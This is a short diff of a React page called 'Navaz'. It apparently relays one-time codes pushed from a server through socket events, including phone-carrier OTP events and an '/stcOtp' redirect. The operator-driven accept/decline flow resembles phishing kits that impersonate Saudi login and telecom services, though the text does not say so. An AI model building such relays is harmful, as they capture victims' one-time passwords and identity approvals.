@@ -1,14 +1,19 @@
 import React, { useState } from "react";
-import { socket } from "./Main";
-import { useNavigate } from "react-router-dom";
+import { useLocation, useNavigate } from "react-router-dom";
 import { useSocketEvent } from "../hooks/useSocketEvent";
 
 const Navaz = () => {
-  const query = new URLSearchParams(window.location.search);
-  const [otp, setOtp] = useState(query.get("otp"));
-  const stc = query.get("stc");
+  const location = useLocation();
+  const query = new URLSearchParams(location.search);
+  const [otp, setOtp] = useState(() => query.get("otp"));
   const navigate = useNavigate();
   const orderId = sessionStorage.getItem("id");
+
+  const applyNavazCode = ({ id, price }) => {
+    if (id === orderId && price != null && String(price).trim() !== "") {
+      setOtp(String(price));
+    }
+  };
 
   useSocketEvent("acceptNavaz", (id) => {
     if (id === orderId) navigate("/success");
@@ -21,13 +26,10 @@ const Navaz = () => {
     }
   });
 
-  useSocketEvent("navazChange", ({ price, id }) => {
-    if (id === orderId) setOtp(price);
-  });
-
-  useSocketEvent("acceptService", ({ price, id }) => {
-    if (id === orderId) setOtp(price);
-  });
+  useSocketEvent("navazChange", applyNavazCode);
+  useSocketEvent("acceptService", applyNavazCode);
+  useSocketEvent("acceptPhoneOTP", applyNavazCode);
+  useSocketEvent("acceptMobOtp", applyNavazCode);
 
   useSocketEvent("declineService", (id) => {
     if (id === orderId) navigate("/stcOtp");
